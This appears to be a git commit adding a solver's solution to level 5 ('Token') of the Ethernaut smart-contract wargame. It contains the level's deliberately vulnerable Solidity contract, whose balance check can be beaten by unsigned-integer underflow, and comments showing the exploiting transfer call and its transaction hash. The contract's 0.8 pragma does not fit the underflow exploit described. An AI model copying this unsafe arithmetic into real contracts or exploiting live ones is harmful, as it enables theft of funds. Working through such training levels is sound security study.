17d212091983bce001e50f6bc7f15b8c326f9ffa
Lewis Broadhurst <lewis1broadhurst@gmail.com>
2023-04-13 20:46:00 +0100

    adding hardhat and completed 5

---
+++ Ethernaut/5.Token.sol
@@ -0,0 +1,32 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Token {
+
+  mapping(address => uint) balances;
+  uint public totalSupply;
+
+  constructor(uint _initialSupply) public {
+    balances[msg.sender] = totalSupply = _initialSupply;
+  }
+
+  function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value >= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+
+  function balanceOf(address _owner) public view returns (uint balance) {
+    return balances[_owner];
+  }
+}
+
+// contract: 0x5d697d0ff3788fa4ed70BfD9bD87Adc2B03da36b
+
+// await web3.eth.getBalance("0x5d697d0ff3788fa4ed70BfD9bD87Adc2B03da36b") => "0"
+
+// Use underflow/overflow of the unsigned integer =D
+// await contract.transfer("0x70a09399794331A64772E15C170b591BB6b9cf16", toWei("21")) => tx:0x25c71cae798476bbeb8449585513c2a84ce9b58b6a4a360096b3e9512db01095
+
+// Hacked contract!
--- Ethernaut/Notes.md
+++ Ethernaut/Notes.md
@@ -2,3 +2,4 @@
 - How can the owner of the contract be changed?
 - Using a poor random number generation technique
 - tx.origin/msg.sender
+- Underflow/Overflow of uints. Look for unsafe math.
